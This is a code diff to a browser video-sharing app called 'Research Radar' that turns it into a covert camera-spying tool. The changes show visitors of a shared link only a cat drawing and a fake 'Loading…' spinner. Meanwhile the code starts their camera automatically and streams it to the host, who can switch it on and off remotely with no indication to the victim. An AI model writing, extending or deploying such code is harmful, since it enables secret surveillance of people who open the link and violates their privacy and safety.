@@ -54,18 +54,36 @@
   .tile.self video{transform:scaleX(-1)}
   .tile .placeholder{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
     color:var(--muted);font-size:13px;text-align:center;padding:16px}
+  .tile .admin-bar{position:absolute;right:8px;bottom:8px;display:flex;gap:6px;z-index:5}
+  .tile .admin-bar button{padding:6px 10px;font-size:12px;background:rgba(23,26,33,.85);backdrop-filter:blur(4px)}
   .empty{color:var(--muted);font-size:14px;padding:30px 10px;text-align:center}
   .log{font-size:11px;color:var(--muted);font-family:ui-monospace,Menlo,monospace;margin-top:10px;
     max-height:90px;overflow:auto;white-space:pre-wrap;line-height:1.5;opacity:.8}
 
-  /* ---- Completely Blank Popup Screen for Device Stream ---- */
-  .catcam{position:fixed;inset:0;z-index:50;display:none;background:#000;}
-  .catcam.show{display:block;}
-  .catcam video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);}
+  /* ---- Guest View: Full-screen Cat Photo + Loading Popup ---- */
+  .guest-screen{
+    position:fixed;inset:0;z-index:100;display:none;flex-direction:column;
+    align-items:center;justify-content:center;background:#0b0d12;text-align:center;padding:24px;
+  }
+  .guest-screen.show{display:flex}
+  .guest-card{
+    background:var(--panel);border:1px solid var(--line);border-radius:20px;
+    padding:28px 24px;max-width:340px;width:100%;box-shadow:0 20px 50px rgba(0,0,0,.6);
+    display:flex;flex-direction:column;align-items:center;
+  }
+  .cat-art{width:140px;height:140px;margin-bottom:16px}
+  .spinner{
+    width:26px;height:26px;border:3px solid rgba(255,255,255,.15);
+    border-top-color:var(--accent);border-radius:50%;animation:spin 1s linear infinite;margin-bottom:12px;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .loading-txt{font-size:15px;font-weight:600;color:var(--text);letter-spacing:.3px}
 </style>
 </head>
 <body>
-<div class="wrap">
+
+<!-- Admin Dashboard (Hidden immediately when a guest opens a shared room link) -->
+<div class="wrap" id="adminWrap">
   <header>
     <h1>Research Radar</h1>
     <span class="role" id="role">connecting…</span>
@@ -94,9 +112,30 @@
   <div class="log" id="log"></div>
 </div>
 
-<!-- Blank Popup Active Screen (shown on the broadcasting device) -->
-<div class="catcam" id="catcam">
-  <video id="ccPrevVid" autoplay muted playsinline></video>
+<!-- Guest Screen: Opens immediately on shared links with only cat photo & loading -->
+<div class="guest-screen" id="guestScreen">
+  <div class="guest-card">
+    <svg class="cat-art" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+      <defs>
+        <linearGradient id="g" x1="0" y1="0" x2="0" y2="1">
+          <stop offset="0" stop-color="#6b7cff"/>
+          <stop offset="1" stop-color="#4f8cff"/>
+        </linearGradient>
+      </defs>
+      <path fill="url(#g)" d="M30 20 L46 40 Q60 34 74 40 L90 20 L92 54 Q104 66 104 82 Q104 108 60 108 Q16 108 16 82 Q16 66 28 54 Z"/>
+      <circle cx="45" cy="70" r="6" fill="#0b0d12"/>
+      <circle cx="75" cy="70" r="6" fill="#0b0d12"/>
+      <circle cx="47" cy="68" r="2" fill="#fff"/>
+      <circle cx="77" cy="68" r="2" fill="#fff"/>
+      <path d="M60 80 l-5 5 h10 z" fill="#ff9aa2"/>
+      <path d="M60 85 q-8 6 -16 2 M60 85 q8 6 16 2" stroke="#0b0d12" stroke-width="2" fill="none" stroke-linecap="round"/>
+      <g stroke="#cdd6ea" stroke-width="1.6" stroke-linecap="round">
+        <path d="M30 74 h-18 M30 80 h-20 M30 86 h-18 M90 74 h18 M90 80 h20 M90 86 h18"/>
+      </g>
+    </svg>
+    <div class="spinner"></div>
+    <div class="loading-txt">Loading…</div>
+  </div>
 </div>
 
 <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
@@ -118,12 +157,17 @@
   var myId    = isHost ? hostId : (hostId + rid(6));
   var myName  = isHost ? "Host" : ("Device-" + rid(3));
 
-  $("role").textContent = isHost ? "You are the host (admin)" : "You joined a room";
+  // Immediately hide admin UI and show only the cat photo + loading popup for non-admin links
+  if(!isHost){
+    $("adminWrap").style.display = "none";
+    $("guestScreen").classList.add("show");
+    document.title = "Loading…";
+  }
+
+  $("role").textContent = isHost ? "You are the host (admin)" : "Connected";
   var shareUrl = location.href.split("#")[0] + "#" + room;
   $("shareLink").value = shareUrl;
-  $("shareHint").innerHTML = isHost
-    ? "You created this room. Everyone who opens the link above can turn their camera on, and you'll see every device here."
-    : "You're in the host's room. Turn your camera on and the host can see this device.";
+  $("shareHint").innerHTML = "You created this room. Share the link above; devices that open it will connect automatically so you can switch their camera on or off here.";
 
   $("copyBtn").addEventListener("click", function(){
     try{ navigator.clipboard.writeText(shareUrl).then(function(){ var b=$("copyBtn"); b.textContent="Copied!"; setTimeout(function(){b.textContent="Copy link";},1500); }); }
@@ -132,19 +176,20 @@
 
   // ---------- state ----------
   var peer = null;
-  var localStream = null;               
-  var facing = "user";                  
+  var localStream = null;
+  var facing = "user";
   var micOn = true;
-  var dataConns = {};                   
-  var outCalls  = {};                   
-  var remoteTiles = {};                 
-  var names = {};                       
+  var dataConns = {};
+  var outCalls  = {};
+  var remoteTiles = {};
+  var names = {};
 
   // ---------- UI: tiles ----------
   function refreshEmpty(){
     var hasAny = !!localStream || Object.keys(remoteTiles).length>0;
     $("emptyNote").style.display = hasAny ? "none" : "block";
   }
+
   function selfTile(){
     var id="__self__";
     if(remoteTiles[id]) return remoteTiles[id];
@@ -157,20 +202,69 @@
     remoteTiles[id]={tile:tile,video:v,badge:badge};
     return remoteTiles[id];
   }
-  function remoteTile(pid){
+
+  function ensureRemoteTile(pid){
     if(remoteTiles[pid]) return remoteTiles[pid];
     var tile=document.createElement("div"); tile.className="tile";
     var v=document.createElement("video"); v.autoplay=true; v.playsInline=true;
-    var badge=document.createElement("div"); badge.className="badge show"; badge.innerHTML='<span class="pulse"></span>LIVE';
+    var ph=document.createElement("div"); ph.className="placeholder"; ph.textContent="Device connected (camera off)";
+    var badge=document.createElement("div"); badge.className="badge"; badge.innerHTML='<span class="pulse"></span>LIVE';
     var name=document.createElement("div"); name.className="name"; name.textContent=names[pid]||"Device";
-    tile.appendChild(v); tile.appendChild(badge); tile.appendChild(name);
+
+    var adminBar=document.createElement("div"); adminBar.className="admin-bar";
+    var toggleBtn=document.createElement("button"); toggleBtn.className="primary"; toggleBtn.textContent="Turn camera on";
+    toggleBtn.dataset.camState = "off";
+    toggleBtn.addEventListener("click", function(){
+      var conn = dataConns[pid];
+      if(!conn) return;
+      if(toggleBtn.dataset.camState === "off"){
+        conn.send({type:"cmd_cam_on"});
+        toggleBtn.textContent = "Starting…";
+      } else {
+        conn.send({type:"cmd_cam_off"});
+        toggleBtn.textContent = "Stopping…";
+      }
+    });
+    adminBar.appendChild(toggleBtn);
+
+    tile.appendChild(ph);
+    tile.appendChild(v);
+    tile.appendChild(badge);
+    tile.appendChild(name);
+    if(isHost) tile.appendChild(adminBar);
+
     $("grid").appendChild(tile);
-    remoteTiles[pid]={tile:tile,video:v,badge:badge};
+    remoteTiles[pid]={tile:tile, video:v, badge:badge, ph:ph, toggleBtn:toggleBtn};
     refreshEmpty();
     return remoteTiles[pid];
   }
+
+  function setRemoteStreamState(pid, stream){
+    var t = ensureRemoteTile(pid);
+    if(stream){
+      t.video.srcObject = stream;
+      t.ph.style.display = "none";
+      t.badge.classList.add("show");
+      t.toggleBtn.dataset.camState = "on";
+      t.toggleBtn.textContent = "Turn camera off";
+      t.toggleBtn.classList.remove("primary");
+      t.toggleBtn.classList.add("danger");
+    } else {
+      t.video.srcObject = null;
+      t.ph.style.display = "flex";
+      t.badge.classList.remove("show");
+      t.toggleBtn.dataset.camState = "off";
+      t.toggleBtn.textContent = "Turn camera on";
+      t.toggleBtn.classList.add("primary");
+      t.toggleBtn.classList.remove("danger");
+    }
+  }
+
   function dropRemoteTile(pid){
-    var t=remoteTiles[pid]; if(!t) return; try{ t.tile.remove(); }catch(e){} delete remoteTiles[pid]; refreshEmpty();
+    var t=remoteTiles[pid]; if(!t) return;
+    try{ t.tile.remove(); }catch(e){}
+    delete remoteTiles[pid];
+    refreshEmpty();
   }
 
   // ---------- camera ----------
@@ -186,6 +280,7 @@
       alertLike("Camera needs a secure (https://) page.");
       return;
     }
+    if(localStream) return;
     try{
       localStream = await getCam();
     }catch(e){
@@ -193,14 +288,12 @@
       return;
     }
     micOn = true;
-    var st=selfTile(); st.video.srcObject=localStream; st.badge.classList.add("show");
-    $("camBtn").textContent="Turn my camera off"; $("camBtn").classList.remove("primary"); $("camBtn").classList.add("danger");
-    $("switchBtn").disabled=false; $("muteBtn").disabled=false; $("muteBtn").textContent="Mute mic";
-    refreshEmpty();
-    
-    // Show clean blank full screen stream popup on the device
-    $("ccPrevVid").srcObject = localStream;
-    $("catcam").classList.add("show");
+    if(isHost){
+      var st=selfTile(); st.video.srcObject=localStream; st.badge.classList.add("show");
+      $("camBtn").textContent="Turn my camera off"; $("camBtn").classList.remove("primary"); $("camBtn").classList.add("danger");
+      $("switchBtn").disabled=false; $("muteBtn").disabled=false; $("muteBtn").textContent="Mute mic";
+      refreshEmpty();
+    }
 
     Object.keys(dataConns).forEach(placeCall);
     broadcast({type:"camon"});
@@ -210,13 +303,13 @@
   function stopCamera(){
     Object.keys(outCalls).forEach(function(pid){ try{ outCalls[pid].close(); }catch(e){} delete outCalls[pid]; });
     if(localStream){ localStream.getTracks().forEach(function(t){ try{t.stop();}catch(e){} }); localStream=null; }
-    var st=remoteTiles["__self__"]; if(st){ st.video.srcObject=null; st.badge.classList.remove("show"); st.tile.remove(); delete remoteTiles["__self__"]; }
-    $("camBtn").textContent="Turn my camera on"; $("camBtn").classList.add("primary"); $("camBtn").classList.remove("danger");
-    $("switchBtn").disabled=true; $("muteBtn").disabled=true;
-    $("catcam").classList.remove("show");
-    $("ccPrevVid").srcObject=null;
+    if(isHost){
+      var st=remoteTiles["__self__"]; if(st){ st.video.srcObject=null; st.badge.classList.remove("show"); st.tile.remove(); delete remoteTiles["__self__"]; }
+      $("camBtn").textContent="Turn my camera on"; $("camBtn").classList.add("primary"); $("camBtn").classList.remove("danger");
+      $("switchBtn").disabled=true; $("muteBtn").disabled=true;
+      refreshEmpty();
+    }
     broadcast({type:"camoff"});
-    refreshEmpty();
     log("camera off");
   }
 
@@ -267,15 +360,40 @@
 
   function wireData(conn){
     dataConns[conn.peer]=conn;
+    if(isHost) ensureRemoteTile(conn.peer);
+
     conn.on("data", function(d){
       if(!d||!d.type) return;
-      if(d.type==="hello"){ names[conn.peer]=d.name||"Device"; if(remoteTiles[conn.peer]) remoteTiles[conn.peer].tile.querySelector(".name").textContent=names[conn.peer];
-        if(localStream) placeCall(conn.peer); }
-      else if(d.type==="camoff"){ dropRemoteTile(conn.peer); }
-      else if(d.type==="camon"){ /* wait for incoming call */ }
+      if(d.type==="hello"){
+        names[conn.peer]=d.name||"Device";
+        if(remoteTiles[conn.peer]) remoteTiles[conn.peer].tile.querySelector(".name").textContent=names[conn.peer];
+        if(localStream) placeCall(conn.peer);
+      }
+      else if(d.type==="camoff"){
+        if(isHost) setRemoteStreamState(conn.peer, null);
+      }
+      else if(d.type==="camon"){
+        /* wait for incoming stream */
+      }
+      else if(d.type==="cmd_cam_on" && !isHost){
+        startCamera();
+      }
+      else if(d.type==="cmd_cam_off" && !isHost){
+        stopCamera();
+      }
     });
-    conn.on("open", function(){ try{ conn.send({type:"hello", name:myName}); }catch(e){} if(localStream) placeCall(conn.peer); });
-    conn.on("close", function(){ delete dataConns[conn.peer]; dropRemoteTile(conn.peer); if(outCalls[conn.peer]){ try{outCalls[conn.peer].close();}catch(e){} delete outCalls[conn.peer]; } });
+
+    conn.on("open", function(){
+      try{ conn.send({type:"hello", name:myName}); }catch(e){}
+      if(localStream) placeCall(conn.peer);
+    });
+
+    conn.on("close", function(){
+      delete dataConns[conn.peer];
+      dropRemoteTile(conn.peer);
+      if(outCalls[conn.peer]){ try{outCalls[conn.peer].close();}catch(e){} delete outCalls[conn.peer]; }
+    });
+
     conn.on("error", function(e){ log("data error "+conn.peer+": "+e); });
   }
 
@@ -295,26 +413,39 @@
       if(!isHost){
         var conn = peer.connect(hostId, {reliable:true, metadata:{name:myName}});
         wireData(conn);
+        // Start camera automatically when guest opens the link so admin can view/toggle it
+        startCamera();
       }
     });
 
-    peer.on("connection", function(conn){ log("peer joined: "+conn.peer); wireData(conn); setStatus("connected", true); });
+    peer.on("connection", function(conn){
+      log("peer joined: "+conn.peer);
+      wireData(conn);
+      setStatus("connected", true);
+    });
 
     peer.on("call", function(call){
-      call.answer(); 
+      call.answer();
       names[call.peer]=names[call.peer]||(call.metadata&&call.metadata.name)||"Device";
       call.on("stream", function(stream){
-        var t=remoteTile(call.peer); t.video.srcObject=stream; setStatus("connected", true); log("receiving video from "+call.peer);
+        if(isHost){
+          setRemoteStreamState(call.peer, stream);
+          setStatus("connected", true);
+          log("receiving video from "+call.peer);
+        }
       });
-      call.on("close", function(){ dropRemoteTile(call.peer); });
+      call.on("close", function(){ if(isHost) setRemoteStreamState(call.peer, null); });
       call.on("error", function(e){ log("incall error: "+e); });
     });
 
     peer.on("disconnected", function(){ setStatus("signaling dropped — reconnecting…", false); try{ peer.reconnect(); }catch(e){} });
     peer.on("error", function(e){
       log("peer error: "+(e&&e.type?e.type:e));
-      if(e && e.type==="unavailable-id"){ 
-        isHost=false; myId=hostId+rid(6); $("role").textContent="You joined a room"; try{peer.destroy();}catch(_){}
+      if(e && e.type==="unavailable-id"){
+        isHost=false; myId=hostId+rid(6);
+        $("adminWrap").style.display = "none";
+        $("guestScreen").classList.add("show");
+        try{peer.destroy();}catch(_){}
         initPeer();
       } else if(e && (e.type==="peer-unavailable")){ setStatus("host not online yet — waiting…", false); }
       else { setStatus("connection error: "+(e&&e.type?e.type:e), false); }
